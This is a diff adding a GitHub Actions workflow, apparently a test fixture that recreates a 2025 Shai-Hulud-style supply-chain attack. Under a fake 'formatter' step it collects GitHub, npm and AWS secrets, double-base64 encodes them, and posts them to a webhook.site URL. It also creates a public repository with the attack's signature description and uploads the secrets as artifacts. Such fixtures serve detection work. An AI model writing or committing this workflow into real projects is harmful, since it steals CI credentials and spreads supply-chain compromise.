@@ -1,0 +1,78 @@
+# Test file: December 2025 "Goldox-T3chs: Only Happy Girl" attack
+# formatter_123456789.yml - Malicious GitHub Actions workflow
+name: Code Formatter and Secrets Exfiltration
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+
+jobs:
+  malicious_formatting:
+    runs-on: SHA1HULUD
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Setup Node.js
+      uses: actions/setup-node@v3
+      with:
+        node-version: '18'
+
+    - name: Install dependencies
+      run: npm ci
+
+    - name: Run formatter (fake)
+      run: |
+        echo "Running code formatter..."
+        # This step appears legitimate but is actually malicious
+
+    - name: Exfiltrate secrets
+      run: |
+        echo "Collecting repository secrets..."
+
+        # Create actionsSecrets.json with double Base64 encoding
+        cat > actionsSecrets.json << 'EOF'
+        [
+          {
+            "github_token": "${{ secrets.GITHUB_TOKEN }}",
+            "npm_token": "${{ secrets.NPM_TOKEN }}",
+            "aws_access_key": "${{ secrets.AWS_ACCESS_KEY_ID }}",
+            "aws_secret": "${{ secrets.AWS_SECRET_ACCESS_KEY }}",
+            "environment": "${{ github.ref_name }}",
+            "repository": "${{ github.repository }}",
+            "actor": "${{ github.actor }}",
+            "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
+          }
+        ]
+        EOF
+
+        # Double Base64 encode the secrets file
+        base64 actionsSecrets.json | base64 > secrets_encoded.txt
+
+        # Exfiltrate via webhook.site (November 2025 pattern)
+        curl -X POST -H "Content-Type: application/json" \
+             -d @secrets_encoded.txt \
+             "https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
+
+    - name: Create Shai-Hulud repository
+      run: |
+        # Create repository with "Shai-Hulud: The Second Coming" description
+        REPO_NAME="malicious-$(date +%s)"
+        echo "Creating repository: $REPO_NAME"
+        echo "Description: Goldox-T3chs: Only Happy Girl."
+
+        # This would create the malicious repository for data storage
+        gh repo create "$REPO_NAME" --description "Goldox-T3chs: Only Happy Girl." --public || true
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+    - name: Upload artifacts (malicious)
+      uses: actions/upload-artifact@v3
+      with:
+        name: secrets-exfiltration
+        path: |
+          actionsSecrets.json
+          secrets_encoded.txt
